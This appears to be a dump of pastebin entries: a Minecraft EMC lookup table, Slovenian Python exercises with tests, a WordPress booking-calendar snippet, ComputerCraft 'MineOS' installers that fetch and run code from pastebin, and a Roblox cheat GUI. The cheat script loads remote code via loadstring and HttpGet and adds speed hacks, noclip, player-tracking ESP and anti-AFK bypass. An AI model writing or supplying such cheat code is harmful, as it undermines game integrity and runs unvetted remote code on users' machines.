  ""blockcraftery:editable_stairs|0"": 6,
  ""quark:elder_prismarine_dark_stairs|0"": 780,
  ""quark:glowshroom|0"": 64,
  ""fairylights:garland|0"": 260,
  ""projectred-exploration:sapphire_saw|0"": 2060,
  ""minecraft:coal_block|0"": 1152,
  ""chisel:glassdyedyellow|4"": 1,
  ""chisel:glassdyedyellow|5"": 1,
  ""chisel:glassdyedyellow|0"": 1,
  ""chisel:glassdyedyellow|1"": 1,
  ""minecraft:packed_ice|0"": 4,
  ""chisel:glassdyedyellow|2"": 1,
  ""chisel:glassdyedyellow|3"": 1,
  ""quark:stained_planks_gray_slab|0"": 4,
  ""minecraft:water_bucket|0"": 768,
  ""minecraft:iron_bars|0"": 96,
  ""minecraft:mycelium|0"": 2,
  ""minecraft:poisonous_potato|0"": 64,
  ""extratrees:fence.gates.purpleheart|0"": 32
}
]]

local emcLookup = {}

local lookuptable = textutils.unserializeJSON(lookuptableJson)

function emcLookup.itemDetail (getItemDetailOutput)
    if getItemDetailOutput then
        local itemName = getItemDetailOutput[""name""]
        local itemData = getItemDetailOutput[""damage""]
        local itemCount = getItemDetailOutput[""count""]
        
        return emcLookup.emc(itemName, itemData)
    end
end

function emcLookup.stackDetail (getItemDetailOutput)
    if getItemDetailOutput then
        local itemName = getItemDetailOutput[""name""]
        local itemData = getItemDetailOutput[""damage""]
        local itemCount = getItemDetailOutput[""count""]
        
        local emc = emcLookup.emc(itemName, itemData)
        if emc then        
            return emc * itemCount 
        end
    end
end

function emcLookup.emc (name, data)
    data = data or 0
    return lookuptable[name..""|""..data]
end

return emcLookup"
zUfSPSYM,BeFish Script,ANPstore,Lua,Tuesday 22nd of July 2025 11:17:41 AM CDT,"-- ONLY WORKS IN SPECIFIC GAME PLACE ID
if game.PlaceId ~= 94503612388426 then return end

getgenv().SecureMode = true
local Rayfield = loadstring(game:HttpGet(""https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua""))()

-- Services
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService(""RunService"")
local Lighting = game:GetService(""Lighting"")
local TeleportService = game:GetService(""TeleportService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local SoundService = game:GetService(""SoundService"")

-- Settings
local speedBoost = 30
local speedBoostEnabled = true  -- Default enabled
local noclip = false
local connections = {}
local currentFishForm = nil
local lastValidPosition = nil

local tracerEnabled = false
local espEnabled = false
local espObjects = {}

-- 1. FIXED SPEED BOOST SYSTEM
local speedConnection = nil

local function applySpeedBoost()
    -- Hapus koneksi sebelumnya jika ada
    if speedConnection then
        speedConnection:Disconnect()
        speedConnection = nil
    end
    
    if speedBoostEnabled then
        speedConnection = RunService.Heartbeat:Connect(function()
            local character = LocalPlayer.Character
            if character then
                local humanoid = character:FindFirstChildOfClass(""Humanoid"")
                if humanoid then
                    -- Terapkan speed boost dan jaga agar tidak direset game
                    humanoid.WalkSpeed = speedBoost
                    if humanoid:GetAttribute(""WalkSpeed"") ~= speedBoost then
                        humanoid:SetAttribute(""WalkSpeed"", speedBoost)
                    end
                end
            end
        end)
    else
        -- Reset ke walk speed default jika dimatikan
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChildOfClass(""Humanoid"")
            if humanoid then
                humanoid.WalkSpeed = 16
                humanoid:SetAttribute(""WalkSpeed"", nil)
            end
        end
    end
end

-- 2. FISH TRANSFORM SYSTEM (NoClip tetap mempertahankan bentuk ikan)
local function transformToFish(fishName)
    local character = LocalPlayer.Character
    if not character then return end
    
    currentFishForm = fishName
    character:SetAttribute(""FishForm"", fishName)
    
    pcall(function()
        -- Hapus bentuk ikan sebelumnya
        for _, child in pairs(character:GetChildren()) do
            if child:IsA(""Model"") and child.Name == ""FishForm"" then
                child:Destroy()
            end
        end
        
        -- Cari model ikan
        local fishModel = ReplicatedStorage:FindFirstChild(""FishModels"") and ReplicatedStorage.FishModels:FindFirstChild(fishName)
        if fishModel then
            local newFish = fishModel:Clone()
            newFish.Name = ""FishForm""
            newFish.Parent = character
            
            -- Reset humanoid properties
            local humanoid = character:FindFirstChildOfClass(""Humanoid"")
            if humanoid then
                humanoid:ApplyDescription(humanoid:GetAppliedDescription())
            end
        end
    end)
end

-- 3. NO CLIP SYSTEM dengan pertahankan bentuk ikan
local function applyNoClip(state)
    if not LocalPlayer.Character then return end
    
    for _, conn in pairs(connections) do
        conn:Disconnect()
    end
    connections = {}
    
    noclip = state
    
    if noclip then
        local character = LocalPlayer.Character
        
        -- Simpan bentuk ikan saat ini
        local fish = character:FindFirstChild(""FishForm"")
        if fish then
            currentFishForm = fish.Name
        end
        
        -- Handle respawn
        local conn1 = character:FindFirstChildOfClass(""Humanoid"").Died:Connect(function()
            task.wait(1)
            if noclip and currentFishForm then
                local newChar = LocalPlayer.Character
                if newChar then
                    transformToFish(currentFishForm)
                    applyNoClip(true)
                end
            end
        end)
        
        -- NoClip loop
        local conn2 = RunService.Stepped:Connect(function()
            if LocalPlayer.Character then
                local rootPart = LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"")
                if rootPart then
                    lastValidPosition = rootPart.Position
                    for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                        if part:IsA(""BasePart"") then
                            part.CanCollide = false
                            part.Velocity = Vector3.new(0, 0, 0)
                            part.RotVelocity = Vector3.new(0, 0, 0)
                        end
                    end
                end
            end
        end)
        
        table.insert(connections, conn1)
        table.insert(connections, conn2)
    else
        -- Ketika noclip dimatikan
        if LocalPlayer.Character then
            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA(""BasePart"") then
                    part.CanCollide = true
                end
            end
        end
    end
end

-- 4. ANTI-LAG SYSTEM (Hapus Build dan Audio)
local function optimizedAntiLag()
    -- Hapus folder Build di Workspace
    local buildFolder = workspace:FindFirstChild(""Build"")
    if buildFolder then
        pcall(function() buildFolder:Destroy() end)
    end
    
    -- Hapus Audio di ReplicatedStorage
    local audioFolder = ReplicatedStorage:FindFirstChild(""Audio"")
    if audioFolder then
        pcall(function()
            for _, sound in ipairs(audioFolder:GetDescendants()) do
                if sound:IsA(""Sound"") then
                    sound:Stop()
                    sound.Playing = false
                    sound.Volume = 0
                    sound:Destroy()
                end
            end
            audioFolder:Destroy()
        end)
    end
    
    -- Hapus sound di SoundService
    pcall(function()
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA(""Sound"") then
                sound:Stop()
                sound.Playing = false
                sound.Volume = 0
            end
        end
    end)
    
    -- Pengaturan visual
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 2
    
    -- Hapus efek langit
    for _, obj in ipairs(Lighting:GetChildren()) do
        if obj:IsA(""Sky"") or obj:IsA(""Atmosphere"") or obj:IsA(""Clouds"") then
            pcall(function() obj:Destroy() end)
        end
    end
    
    -- Buat langit hitam
    local blackSky = Instance.new(""Sky"", Lighting)
    blackSky.SkyboxBk = ""rbxassetid://1""
    blackSky.SkyboxDn = ""rbxassetid://1""
    blackSky.SkyboxFt = ""rbxassetid://1""
    blackSky.SkyboxLf = ""rbxassetid://1""
    blackSky.SkyboxRt = ""rbxassetid://1""
    blackSky.SkyboxUp = ""rbxassetid://1""
    
    Rayfield:Notify({
        Title = ""Anti-Lag Activated"",
        Content = ""Build folder and audio files removed"",
        Duration = 3,
        Image = 4483362458,
    })
end

-- 5. ESP SYSTEM
local function updateESP()
    -- Bersihkan ESP lama
    for _, obj in pairs(espObjects) do
        if obj then pcall(function() obj:Destroy() end) end
    end
    espObjects = {}
    
    if not (tracerEnabled or espEnabled) then return end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local rootPart = player.Character:FindFirstChild(""HumanoidRootPart"")
            local head = player.Character:FindFirstChild(""Head"")
            
            if rootPart and head then
                -- Tracer ESP
                if tracerEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                    local attachment0 = Instance.new(""Attachment"")
                    attachment0.Name = ""ESP_Attachment_""..player.Name
                    attachment0.Parent = LocalPlayer.Character.HumanoidRootPart
                    
                    local attachment1 = Instance.new(""Attachment"")
                    attachment1.Name = ""ESP_Attachment_""..player.Name
                    attachment1.Parent = rootPart
                    
                    local beam = Instance.new(""Beam"")
                    beam.Attachment0 = attachment0
                    beam.Attachment1 = attachment1
                    beam.Color = ColorSequence.new(Color3.fromRGB(255, 100, 0))
                    beam.Brightness = 10
                    beam.Width0 = 0.2
                    beam.Width1 = 0.2
                    beam.Parent = attachment0
                    
                    table.insert(espObjects, attachment0)
                    table.insert(espObjects, attachment1)
                    table.insert(espObjects, beam)
                end
                
                -- NameTag ESP
                if espEnabled then
                    local billboard = Instance.new(""BillboardGui"")
                    billboard.Name = ""ESP_NameTag_""..player.Name
                    billboard.Size = UDim2.new(0, 100, 0, 40)
                    billboard.AlwaysOnTop = true
                    billboard.MaxDistance = 1000
                    billboard.Parent = head
                    
                    local text = Instance.new(""TextLabel"")
                    text.Size = UDim2.new(1, 0, 1, 0)
                    text.BackgroundTransparency = 1
                    text.TextColor3 = Color3.fromRGB(255, 255, 0)
                    text.Text = player.Name
                    text.TextScaled = true
                    text.Font = Enum.Font.SourceSansBold
                    text.TextStrokeTransparency = 0.5
                    text.TextStrokeColor3 = Color3.new(0, 0, 0)
                    text.Parent = billboard
                    
                    table.insert(espObjects, billboard)
                end
            end
        end
    end
end

-- 6. MAIN LOOP untuk semua sistem
local function mainLoop()
    local character = LocalPlayer.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass(""Humanoid"")
    local rootPart = character:FindFirstChild(""HumanoidRootPart"")
    
    if humanoid and rootPart then
        -- Speed boost (diperbaiki)
        if speedBoostEnabled then
            humanoid.WalkSpeed = speedBoost
            if humanoid:GetAttribute(""WalkSpeed"") ~= speedBoost then
                humanoid:SetAttribute(""WalkSpeed"", speedBoost)
            end
        end
        
        -- Anti-teleport check
        if lastValidPosition and (rootPart.Position - lastValidPosition).Magnitude > 50 then
            rootPart.CFrame = CFrame.new(lastValidPosition)
        else
            lastValidPosition = rootPart.Position
        end
    end
    
    -- Update ESP
    if tracerEnabled or espEnabled then
        updateESP()
    end
end

-- Handle character added
LocalPlayer.CharacterAdded:Connect(function(character)
    task.wait(0.5) -- Tunggu karakter selesai load
    
    -- Reapply semua fitur
    if speedBoostEnabled then
        applySpeedBoost()
    end
    
    if noclip and currentFishForm then
        transformToFish(currentFishForm)
        applyNoClip(true)
    end
end)

-- Initialize
RunService.Heartbeat:Connect(mainLoop)

-- GUI Setup
local Window = Rayfield:CreateWindow({
    Name = ""[🐠] Be Fish GUI"",
    LoadingTitle = ""Be Fish Tools"",
    LoadingSubtitle = ""All Features Working"",
    KeySystem = false,
})

-- Fish Tab
local FishTab = Window:CreateTab(""Fish"", 4483362458)

FishTab:CreateSlider({
    Name = ""Speed Boost (16-100)"",
    Range = {16, 100},
    Increment = 1,
    CurrentValue = speedBoost,
    Callback = function(val)
        speedBoost = val
        if speedBoostEnabled then
            applySpeedBoost()
        end
        Rayfield:Notify({
            Title = ""Speed Changed"",
            Content = ""Speed set to: ""..speedBoost,
            Duration = 2,
            Image = 4483362458,
        })
    end,
})

FishTab:CreateToggle({
    Name = ""Enable Speed Boost"",
    CurrentValue = speedBoostEnabled,
    Callback = function(val)
        speedBoostEnabled = val
        applySpeedBoost()
        Rayfield:Notify({
            Title = ""Speed Boost ""..(val and ""Enabled"" or ""Disabled""),
            Content = val and ""Current speed: ""..speedBoost or ""Walk speed reset to default"",
            Duration = 3,
            Image = 4483362458,
        })
    end
})

FishTab:CreateToggle({
    Name = ""Tracer ESP (Bright)"",
    CurrentValue = tracerEnabled,
    Callback = function(val)
        tracerEnabled = val
    end
})

FishTab:CreateToggle({
    Name = ""ESP NameTag (Bright)"",
    CurrentValue = espEnabled,
    Callback = function(val)
        espEnabled = val
    end
})

-- Misc Tab
local MiscTab = Window:CreateTab(""Misc"", 4483362458)

MiscTab:CreateButton({
    Name = ""Advanced Anti-Lag"",
    Callback = function()
        optimizedAntiLag()
    end
})

MiscTab:CreateToggle({
    Name = ""No Clip (Keep Fish Form)"",
    CurrentValue = noclip,
    Callback = function(val)
        if val then
            local character = LocalPlayer.Character
            if character then
                local fish = character:FindFirstChild(""FishForm"")
                if fish then
                    currentFishForm = fish.Name
                else
                    currentFishForm = character:GetAttribute(""FishForm"")
                end
            end
        end
        applyNoClip(val)
    end
})

MiscTab:CreateButton({
    Name = ""Anti AFK"",
    Callback = function()
        for _, v in pairs(getconnections(LocalPlayer.Idled)) do
            v:Disable()
        end
        Rayfield:Notify({
            Title = ""Anti AFK Activated"",
            Content = ""You won't be kicked for being AFK"",
            Duration = 3,
            Image = 4483362458,
        })
    end
})

-- Server Tab
local ServerTab = Window:CreateTab(""Server"", 4483362458)

ServerTab:CreateButton({
    Name = ""Rejoin Server"",
    Callback = function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end
})

ServerTab:CreateButton({
    Name = ""Respawn Character"",
    Callback = function()
        local char = LocalPlayer.Character
        if char then
            char:BreakJoints()
        end
    end
})

ServerTab:CreateButton({
    Name = ""Change Server"",
    Callback = function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})

-- Info Tab
local InfoTab = Window:CreateTab(""Info"", 4483362458)

InfoTab:CreateParagraph({
    Title = ""Script by @TakayamaZhou"",
    Content = ""For testing purposes only""
})

InfoTab:CreateButton({
    Name = ""Join Community"",
    Callback = function()
        setclipboard(""https://discord.gg/examplecommunity"")
        Rayfield:Notify({
            Title = ""Community Link Copied"",
            Content = ""The Discord link has been copied to clipboard"",
            Duration = 6.5,
            Image = 4483362458,
        })
    end
})

InfoTab:CreateButton({
    Name = ""Donate"",
    Callback = function()
        setclipboard(""https://paypal.me/exampledonate"")
        Rayfield:Notify({
            Title = ""Donation Link Copied"",
            Content = ""The donation link has been copied to clipboard"",
            Duration = 6.5,
            Image = 4483362458,
        })
    end
})

-- Load GUI
Rayfield:LoadConfiguration()

-- Notify when loaded
Rayfield:Notify({
    Title = ""All Features Loaded"",
    Content = ""Speed boost fixed and all features are working!"",
    Duration = 5,
    Image = 4483362458,
})

-- Keybind untuk menampilkan atau menyembunyikan UI Rayfield
Window:CreateKeybind({
   Name = ""Toggle UI (RightCtrl)"",
   CurrentKeybind = Enum.KeyCode.RightControl,
   HoldToInteract = false,
   Callback = function()
      Rayfield:Toggle()
   end,
})
"
yvzGrE1N,Untitled,Josif_tepe,Python,Tuesday 22nd of July 2025 11:03:42 AM CDT,"import unittest
import os
import warnings

class NoWarning(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter(""ignore"", ResourceWarning)

def unikati(s):
    visited = {}
    res = []

    for name in s:
        if name not in visited:
            res.append(name)
            visited[name] = True

    return res

def skupnih(s, t):
    set_s = set()
    set_t = set()

    for name in s:
        set_s.add(name)

    for name in t:
        set_t.add(name)

    cnt = 0
    for name in set_s:
        if name in set_t:
            cnt += 1

    return cnt

def vseh(s, t):
    unique_elements = set()

    for name in s:
        unique_elements.add(name)

    for name in t:
        unique_elements.add(name)

    return len(unique_elements)

def preberi_datoteko(ime_dat, locilo):
    res_arr = []
    with open(ime_dat, ""r"") as f:
        for line in f:
            tmp_arr = line.split(locilo)
            res_arr.append(tmp_arr)

    return res_arr

def filtriran(s, stolpec, vrednost):
    res_arr = []
    for arr in s:
        if len(arr) > stolpec:
            if type(vrednost) == type(arr[stolpec]) and vrednost == arr[stolpec]:
                res_arr.append(arr)

    return res_arr
def izlusci(s, stolpec):
    res_arr = []
    for arr in s:
        if len(arr) > stolpec:
            res_arr.append(arr[stolpec])

    return res_arr

def predmeti(ime_dat, osebe):
    visited = set()
    arr = []
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if osebe == a[1]:
                if a[0] not in visited:
                    visited.add(a[0])
                    arr.append(a[0])

    return arr
def osebe(ime_dat, predmet):
    arr = []
    visited = set()
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[0] == predmet:
                if a[1] not in visited:
                    visited.add(a[1])
                    arr.append(a[1])

    return list(arr)

def podobnost_oseb(ime_dat, oseba1, oseba2):
    predmeti_1 = set()
    predmeti_2 = set()
    predmeti = set()
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[1] == oseba1:
                predmeti_1.add(a[0])
                predmeti.add(a[0])


            if a[1] == oseba2:
                predmeti_2.add(a[0])
                predmeti.add(a[0])

    zaednicki = 0
    for predmet in predmeti_1:
        if predmet in predmeti_2:
            zaednicki += 1

    return zaednicki / float(len(predmeti))
def podobnost_predmetov(ime_dat, predmet1, predmet2):
    p1 = set()
    p2 = set()
    p = set()

    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[0] == predmet1:
                p1.add(a[1])
                p.add(a[1])

            if a[0] == predmet2:
                p2.add(a[1])
                p.add(a[1])

    zaednicki = 0
    for lice in p1:
        if lice in p2:
            zaednicki += 1

    return zaednicki / float(len(p))

class TestSeznami(NoWarning):
    def test_01_unikati(self):
        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        t = s.copy()
        self.assertEqual([""Ana"", ""Berta"", ""Cilka"", ""Ema"", ""Dani""], unikati(s))
        self.assertEqual(t, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual([], unikati([]))
        self.assertEqual([""Ana""], unikati([""Ana""]))
        self.assertEqual([5, 8, 3], unikati([5, 8, 3]))
        self.assertEqual([5, 8, 3], unikati([5, 5, 5, 5, 8, 5, 8, 8, 8, 3, 3, 3, 5]))

    def test_02_skupnih(self):
        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        sc = s.copy()
        t = [""Cilka"", ""Fanči"", ""Ana"", ""Ana"", ""Fanči"", ""Ana"", ""Cilka""]
        tc = t.copy()
        self.assertEqual(2, skupnih(s, t))
        self.assertEqual(2, skupnih(t, s))
        self.assertEqual(sc, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(tc, t, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(0, skupnih(s, [""Fanči"", ""Greta""]))
        self.assertEqual(1, skupnih(t, [""Fanči"", ""Greta""]))
        self.assertEqual(0, skupnih(s, []))
        self.assertEqual(0, skupnih([], []))

    def test_03_vseh(self):
        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        sc = s.copy()
        t = [""Cilka"", ""Fanči"", ""Ana"", ""Ana"", ""Fanči"", ""Ana"", ""Cilka""]
        tc = t.copy()
        self.assertEqual(6, vseh(s, t))
        self.assertEqual(6, vseh(t, s))
        self.assertEqual(sc, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(tc, t, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(7, vseh(s, [""Fanči"", ""Greta""]))
        self.assertEqual(4, vseh(t, [""Fanči"", ""Greta""]))
        self.assertEqual(5, vseh(s, []))
        self.assertEqual(0, vseh([], []))


class TestProcesiranjeSeznamov(NoWarning):
    def test_01_preberi_datoteko(self):
        self.assertEqual([['Cube', '5031', '159', 'Janez', '2017\n'],
                          ['Stevens', '3819', '1284', 'Ana', '2012\n'],
                          ['Focus', '3823', '1921', 'Benjamin', '2019\n']],
                         preberi_datoteko(""kolesa.txt"", ""-""))
        self.assertEqual([['slika', 'Berta', '31\n'],
                          ['slika', 'Ana', '33\n'],
                          ['slika', 'Berta', '35\n'],
                          ['slika', 'Fanči', '37\n'],
                          ['slika', 'Ana', '40\n']],
                         preberi_datoteko(""zapisnik.txt"", "","")[:5])

    def test_02_filter(self):
        s = [[""Ana"", 5, 9, ""Berta""],
             [""Cilka"", 5, 12, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""],
             [""Berta"", 5, 1, ""Ana""]]
        self.assertEqual(
            [[""Ana"", 5, 9, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""]], filtriran(s, 0, ""Ana"")
        )
        self.assertEqual(
            [[""Ana"", 5, 9, ""Cilka""],
             [""Ana"", 5, 9, ""Berta""]], filtriran(s[::-1], 0, ""Ana"")
        )
        self.assertEqual(s, filtriran(s, 1, 5))
        self.assertEqual([], filtriran(s, 0, ""Dani""))
        self.assertEqual([[""Ana"", 5, 9, ""Cilka""]], filtriran(s, 3, ""Cilka""))

    def test_03_izlusci(self):
        s = [[""Ana"", 5, 9, ""Berta""],
             [""Cilka"", 5, 12, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""],
             [""Berta"", 5, 1, ""Ana""]]
        self.assertEqual([""Ana"", ""Cilka"", ""Ana"", ""Berta""], izlusci(s, 0))
        self.assertEqual([5, 5, 5, 5], izlusci(s, 1))
        self.assertEqual([9, 12, 9, 1], izlusci(s, 2))


class TestDrazba(NoWarning):
    def test_01_predmeti(self):
        self.assertEqual(['slika', 'Meldrumove vaze'], predmeti(""zapisnik.txt"", ""Ana""))
        self.assertEqual(['slika', 'skodelice', 'kip', 'čajnik'], predmeti(""zapisnik.txt"", ""Berta""))
        self.assertEqual(['Meldrumove vaze', 'kip', 'srebrn jedilni servis'], predmeti(""zapisnik.txt"", ""Cilka""))
        self.assertEqual([], predmeti(""zapisnik.txt"", ""Benjamin""))

        try:
            os.rename(""zapisnik.txt"", ""zapisnik-2.txt"")
            self.assertEqual(['slika', 'Meldrumove vaze'], predmeti(""zapisnik-2.txt"", ""Ana""))
        finally:
            os.rename(""zapisnik-2.txt"", ""zapisnik.txt"")

    def test_02_osebe(self):
        self.assertEqual(['Cilka', 'Ema', 'Berta', 'Dani', 'Greta'], osebe(""zapisnik.txt"", ""kip""))
        self.assertEqual(['Fanči', 'Helga'], osebe(""zapisnik.txt"", ""perzijska preproga""))
        self.assertEqual([], osebe(""zapisnik.txt"", ""stol brez noge""))

    def test_03_podobnost_oseb(self):
        self.assertAlmostEqual(0.2, podobnost_oseb(""zapisnik.txt"", ""Ana"", ""Berta""))
        self.assertAlmostEqual(0.5, podobnost_oseb(""zapisnik.txt"", ""Cilka"", ""Ema""))
        self.assertAlmostEqual(0.25, podobnost_oseb(""zapisnik.txt"", ""Ana"", ""Cilka""))
        self.assertAlmostEqual(1 / 6, podobnost_oseb(""zapisnik.txt"", ""Berta"", ""Cilka""))
        self.assertAlmostEqual(1, podobnost_oseb(""zapisnik.txt"", ""Berta"", ""Berta""))

    def test_04_podobnost_predmetov(self):
        self.assertAlmostEqual(0.4, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""skodelice""))
        self.assertAlmostEqual(1 / 7, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""slika""))
        self.assertAlmostEqual(0, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""perzijska preproga""))
        self.assertAlmostEqual(1, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""kip""))


# class TestPriporocila(NoWarning):
#     def test_01_priporoci_predmet(self):
#         self.assertEqual(""srebrn jedilni servis"", priporoci_predmet(""zapisnik.txt"", ""kip""))
#         self.assertEqual(""Meldrumove vaze"", priporoci_predmet(""zapisnik.txt"", ""slika""))
#
#     def test_02_priporoci_prijatelja(self):
#         self.assertEqual(""Fanči"", priporoci_prijatelja(""zapisnik.txt"", ""Ana""))
#         self.assertEqual(""Dani"", priporoci_prijatelja(""zapisnik.txt"", ""Berta""))
#

if __name__ == ""__main__"":
    unittest.main()"
MwmQiMfJ,wcfm-booking-calendar-event-visibility,palsushobhan,PHP,Tuesday 22nd of July 2025 10:19:36 AM CDT,"add_action('after_wcfm_load_scripts', function($endpoint) {
    if('wcfm-bookings-calendar' === $endpoint) { 
        if (defined('WC_BOOKINGS_VERSION') && version_compare(WC_BOOKINGS_VERSION, '1.15.0', '>=')) {
            $admin_script_dependencies = wc_booking_get_script_dependencies( 'admin', [ 'jquery-ui-datepicker', 'jquery-ui-sortable' ] );
            wp_enqueue_script( 'wc_bookings_admin_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin.js', $admin_script_dependencies, WC_BOOKINGS_VERSION, true );
            if (WC_BOOKINGS_GUTENBERG_EXISTS) {
                $admin_calendar_gutenberg_deps = wc_booking_get_script_dependencies( 'admin-calendar-gutenberg', array( 'wc_bookings_admin_js' ) );
                wp_enqueue_script( 'wc_bookings_admin_calendar_gutenberg_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin-calendar-gutenberg.js', $admin_calendar_gutenberg_deps, WC_BOOKINGS_VERSION, true );
            }
            
            wp_enqueue_script( 'wc_bookings_admin_calendar_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin-calendar.js', wc_booking_get_script_dependencies( 'admin-calendar' ), WC_BOOKINGS_VERSION, true );
        }
    }
}, 29);

add_action( 'wp_footer', function() {
    global $wp;
    if( is_wcfm_page() && isset($wp->query_vars['wcfm-bookings-calendar']) && class_exists( 'WC_Site_Tracking' )) {
        WC_Site_Tracking::add_tracking_function();
    }
} );

add_action('after_wcfm_load_styles', function($endpoint) {
    if('wcfm-bookings-calendar' === $endpoint && WC_BOOKINGS_GUTENBERG_EXISTS) {
        wp_enqueue_style('wc_bookings_admin_calendar_css', WC_BOOKINGS_PLUGIN_URL.'/dist/admin-calendar-gutenberg.css', null, WC_BOOKINGS_VERSION);
        $calendar_event_popup_css = ""
            .wc-bookings-calendar-popover .components-popover__content {
                background: #fff;
                border-radius: 4px;
                box-shadow: 0 0 0 1px #ccc,0 2px 3px #0000000d,0 4px 5px #0000000a,0 12px 12px #00000008,0 16px 16px #00000005;
                box-sizing: border-box;
                width: min-content;
            }"";
        wp_add_inline_style( 'wc_bookings_admin_calendar_css', $calendar_event_popup_css );
    }
}, 29);"
upy0WdSS,2.4I,GochiPC,Lua,Tuesday 22nd of July 2025 09:42:32 AM CDT,"term.clear()
term.setCursorPos(1,1)
print(""Please wait..."")
sleep(3)
term.clear()
term.setCursorPos(1,1)
print(""Welcome to MineOS 2.4 Installer"")
print(""type start/exit"")
print(""warning if you have other os it will removes startup file"")
local choice = read()

if choice == ""start"" then
  print(""Please wait this will take secs"")
  sleep(1)
  shell.run(""delete startup.lua"")
  shell.run(""pastebin get 6G1Fsc9w startup.lua"")
  print(""rebooting..."")
  sleep(3)
  os.reboot()
elseif choice == ""exit"" then
  print(""exiting the installer"")
  return
else
  print(""Invalid option"")
end
"
KnBhCfkR,2.4U,GochiPC,Lua,Tuesday 22nd of July 2025 09:40:49 AM CDT,"local label = os.getComputerLabel()

if label == ""2.4"" then
  print(""You allready have this version "" .. label)
  return
end

if label == ""2.1"" or label == ""2.2"" or label == ""2.3"" then
    term.clear()
    term.setCursorPos(1,1)
    print(""Welcome to MineUpdater"")
    print(""please wait to update 2.3"")
    sleep(2)
    print(""removing old file"")
    shell.run(""delete startup.lua"")
    sleep(5)
    print(""installing new files"")
    sleep(2)
    shell.run(""pastebin get 6G1Fsc9w startup.lua"")
    sleep(2)
    print(""the update complete"")
    print(""please wait this will reboot"")
    sleep(4)
    os.reboot()
end

print(""you dont have MineOS2 or you have Unsupported Version."")"
6G1Fsc9w,2.4,GochiPC,Lua,Tuesday 22nd of July 2025 09:30:37 AM CDT,"-- WARNING DO NOT EDIT SCRIPT THIS EILL BUG OS
-- if you are best at script why you give it an try
-- to see make an os but if you are an noob
-- dont edit

-- Color Saveing
if fs.exists(""bsave.txt"") then
  if not term.isColor() then
   term.setBackgroundColor(colors.black)
  else
   local f = fs.open(""bsave.txt"", ""r"")
   local savedColor = f.readAll()
   f.close()
   if savedColor == ""green"" then
     term.setBackgroundColor(colors.green)
   elseif savedColor == ""blue"" then
     term.setBackgroundColor(colors.blue)
   elseif savedColor == ""black"" then
     term.setBackgroundColor(colors.black)
   elseif savedColor == ""gray"" then
     term.setBackgroundColor(colors.gray)
   end
  end
  term.clear()
end
wel = ""Welcome Player!""

-- MineOS
local running = true

-- start at first
os.setComputerLabel(""2.4"")
term.setCursorPos(1,1)
term.clear()
term.setTextColor(colors.yellow)
if fs.exists(""nsave.txt"") then
      local file = fs.open(""nsave.txt"", ""r"")
      local saved = file.readAll()
      file.close()
      print(""Welcome "" .. saved .. ""!"")
else
      print(wel)
end

local speaker = peripheral.find(""speaker"")
if speaker then
  speaker.playNote(""pling"", 1.0, 12)
  sleep(0.4)
  speaker.playNote(""pling"", 1.0, 10)
end
sleep(3)
term.clear()
term.setCursorPos(1,1)
print(""MineOS2"")

-- prompt
while running do
    
    -- detector
    term.setTextColor(colors.yellow)
    io.write(""> "")
    term.setTextColor(colors.white)
    local input = read()
    local args = {}
    for word in string.gmatch(input, ""[^%s]+"") do
        table.insert(args, word)
    end

    local command = args[1]

-- commands

    if command == ""about"" then
        print(""   _______    MineOS"")
        print(""  |   |   |   Version: 2.4"")
        print(""  | S | e |   Kernel: DEV2"")
        print(""  | O | n |   CCID: "" .. os.getComputerID())
        print(""  |   | i |   Uptime: "" .. math.floor(os.clock()) .. ""s"")
        print(""  | > | M |   CR: 2023 - 2025"")
        if term.isColor() then
            print(""              Color: true"")
        else
            print(""              Color: false"")
        end
        
    elseif command == ""help"" then
        term.setTextColor(colors.orange)
        print(""Help"")
        term.setTextColor(colors.white)
        print(""tipe 'plist' or 'mlist'"")
        
        elseif command == ""plist"" then
        local dir = shell.dir()
        local files = fs.list(dir)
        for i, file in ipairs(files) do
